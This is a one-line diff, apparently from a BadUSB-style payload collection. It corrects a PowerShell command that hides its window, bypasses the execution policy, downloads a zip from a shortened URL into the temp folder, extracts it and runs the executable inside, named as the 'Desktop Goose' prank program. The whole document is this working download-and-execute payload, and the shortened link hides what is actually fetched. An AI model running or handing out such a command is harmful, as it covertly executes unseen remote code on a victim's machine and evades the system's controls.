@@ -1,1 +1,1 @@
-powershell -w -h -NoP -NonI -Ep Bypass $G="$env:tmp"; iwr -Uri 'shorturl.at/XZ347' -O "$G\goose.zip";Expand-Archive "$G\goose.zip" -Des $G -Force;. $G\Goose\GooseDesktop.exe
+powershell -w h -NoP -NonI -Ep Bypass $G="$env:tmp"; iwr -Uri 'shorturl.at/XZ347' -O "$G\goose.zip";Expand-Archive "$G\goose.zip" -Des $G -Force;. $G\Goose\GooseDesktop.exe
